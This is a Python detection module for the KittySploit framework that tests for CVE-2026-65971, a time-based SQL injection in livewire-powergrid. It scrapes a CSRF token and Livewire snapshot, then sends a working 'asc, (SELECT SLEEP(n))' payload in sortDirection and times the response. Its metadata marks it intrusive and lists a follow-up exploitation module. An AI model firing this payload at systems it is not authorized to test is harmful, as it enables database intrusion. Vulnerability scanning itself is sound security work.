#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect CVE-2026-65971 Livewire PowerGrid sortDirection SQLi (time-based)."""

from __future__ import annotations

import html
import json
import re
import time
from typing import Dict, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Livewire PowerGrid CVE-2026-65971 Detect",
        "description": (
            "Detects CVE-2026-65971: time-based SQL injection via sortDirection "
            "in power-components/livewire-powergrid (< 6.10.4) when a column uses "
            "naturalSort(true). Empty sortField bypasses Laravel direction validation."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-65971"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-65971",
            "https://github.com/advisories/GHSA-7fgc-3h6c-698r",
            "https://github.com/BiiTts/POC-CVE-2026-65971",
        ],
        "tags": [
            "livewire",
            "powergrid",
            "laravel",
            "sqli",
            "cve",
            "vuln",
            "cve-2026-65971",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["risk_signals", "exploit_paths"],
            "chain": {
                "produces_capabilities": ["inj_param", "db_access"],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/livewire_powergrid_cve_2026_65971_sqli",
                ],
            },
        },
        "module": "auxiliary/scanner/http/livewire_powergrid_cve_2026_65971_sqli",
        "modules": [
            "auxiliary/scanner/http/livewire_powergrid_cve_2026_65971_sqli",
        ],
    }

    port = OptPort(80, "HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    path = OptString(
        "/",
        "Path of a page that renders a PowerGrid table with naturalSort",
        True,
    )
    livewire_update_path = OptString(
        "/livewire/update",
        "Livewire update endpoint",
        False,
        advanced=True,
    )
    cookie = OptString("", "Optional Cookie header for authenticated tables", False)
    sleep_seconds = OptInteger(3, "MySQL SLEEP() seconds", False, advanced=True)

    def _timeout(self) -> int:
        sleep_s = max(int(self.sleep_seconds or 3), 1)
        return max(int(self.timeout or 30), sleep_s * 3 + 15)

    def _page_path(self) -> str:
        val = str(self.path or "/").strip() or "/"
        return val if val.startswith("/") else f"/{val}"

    def _update_path(self) -> str:
        val = str(self.livewire_update_path or "/livewire/update").strip() or "/livewire/update"
        return val if val.startswith("/") else f"/{val}"

    def _headers(self) -> Dict[str, str]:
        headers = {"User-Agent": "KittySploit-CVE-2026-65971-detect"}
        cookie = str(self.cookie or "").strip()
        if cookie:
            headers["Cookie"] = cookie
        return headers

    def run(self):
        response = self.http_request(
            method="GET",
            path=self._page_path(),
            headers=self._headers(),
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if not response:
            return False
        body = response.text or ""

        csrf = None
        for pattern in (
            r'data-csrf="([A-Za-z0-9]+)"',
            r'"csrf"\s*:\s*"([A-Za-z0-9]+)"',
            r'name="csrf-token"\s+content="([^"]+)"',
        ):
            match = re.search(pattern, body, re.I)
            if match:
                csrf = match.group(1)
                break

        snapshot = None
        for attr in ("wire:snapshot", "wire:initial-data"):
            for raw in re.findall(rf'{attr}="([^"]+)"', body):
                candidate = html.unescape(raw)
                if "sortDirection" in candidate or "PowerGrid" in candidate:
                    snapshot = candidate
                    break
            if snapshot:
                break

        if not csrf or not snapshot:
            return False

        sleep_s = max(int(self.sleep_seconds or 3), 1)

        def update(sort_field: str, sort_direction: str) -> Tuple[float, str]:
            payload = {
                "_token": csrf,
                "components": [
                    {
                        "snapshot": snapshot,
                        "updates": {
                            "sortField": sort_field,
                            "sortDirection": sort_direction,
                        },
                        "calls": [],
                    }
                ],
            }
            headers = self._headers()
            headers.update(
                {
                    "Content-Type": "application/json",
                    "X-CSRF-TOKEN": csrf,
                    "X-Livewire": "1",
                }
            )
            start = time.perf_counter()
            resp = self.http_request(
                method="POST",
                path=self._update_path(),
                headers=headers,
                data=json.dumps(payload),
                timeout=self._timeout(),
                allow_redirects=False,
            )
            elapsed = time.perf_counter() - start
            return elapsed, (resp.text if resp else "") or ""

        baseline, _ = update("", "asc")
        elapsed, resp = update("", f"asc, (SELECT SLEEP({sleep_s}))")
        delta = elapsed - baseline
        threshold = sleep_s * 0.6
        leak = re.search(
            r"SQLSTATE\[\w+\][^\"<]{0,160}|select .{0,60}order by[^\"<]{0,160}",
            resp,
            re.I,
        )
        if delta <= threshold and not leak:
            return False

        reason = (
            f"PowerGrid sortDirection SQLi (CVE-2026-65971) | "
            f"baseline={baseline:.2f}s injected={elapsed:.2f}s delta={delta:.2f}s"
        )
        if leak:
            reason = f"{reason} | sql_echo={leak.group(0)[:120]}"
        self.report_finding(
            "Livewire PowerGrid sortDirection SQL injection",
            severity="critical",
            evidence={
                "path": self._page_path(),
                "livewire_update": self._update_path(),
                "injection": "sortDirection",
                "bypass": "sortField=",
                "baseline_s": round(baseline, 2),
                "injected_s": round(elapsed, 2),
                "cve": "CVE-2026-65971",
            },
            impact={
                "summary": "Attacker-controlled ORDER BY via Livewire property.",
                "business_risk": "Database compromise / data exfiltration",
            },
            remediation={
                "summary": "Upgrade livewire-powergrid to >= 6.10.4.",
                "actions": [
                    "composer update power-components/livewire-powergrid",
                    "Ensure sortDirection is sanitized to asc/desc only",
                ],
            },
        )
        self.set_info(severity="critical", reason=reason, path=self._page_path())
        return True
